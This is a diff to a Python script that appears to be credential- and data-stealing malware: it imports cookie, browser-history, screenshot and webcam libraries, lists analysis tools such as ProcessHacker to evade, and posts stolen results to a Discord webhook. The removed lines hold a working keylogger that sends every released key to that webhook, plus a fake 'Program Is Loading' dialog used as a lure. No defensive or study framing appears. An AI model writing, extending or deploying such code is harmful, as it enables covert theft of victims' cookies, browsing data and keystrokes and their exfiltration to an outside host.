@@ -3,10 +3,7 @@ import browser_cookie3
 import cv2
 import re, uuid
 from PIL import ImageGrab
-from pynput import keyboard
 from browser_history.browsers import Chrome
-import ctypes 
-ctypes.windll.user32.MessageBoxW(0, "Please Wait The Program Is Loading ", "Program", 1)
 webhook = "Webhooksss"
 process = [
     "ProcessHacker.exe",
@@ -275,26 +272,9 @@ except:
                     "author": {
                     "icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"
                     },
-                    "description": f"```Failed To Grab Chromes Browser History And A Keylogger Has Been Activated```",                      
+                    "description": f"```Failed To Grab Chromes Browser History```",                      
                 }
             ]
 
         }
      requests.post(webhook, json=embeded) 
-     pass
-def on_release(key):
-     embeded = {
-          "avatar_url":"https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
-                      "embeds": [
-                {
-                    "author": {
-                    "icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"
-                    },
-                    "description": f"```Key {key} Was Clicked```",                      
-                }
-            ]
-
-        }
-     requests.post(webhook, json=embeded) 
-with keyboard.Listener(on_release=on_release) as listener:
-    listener.join()
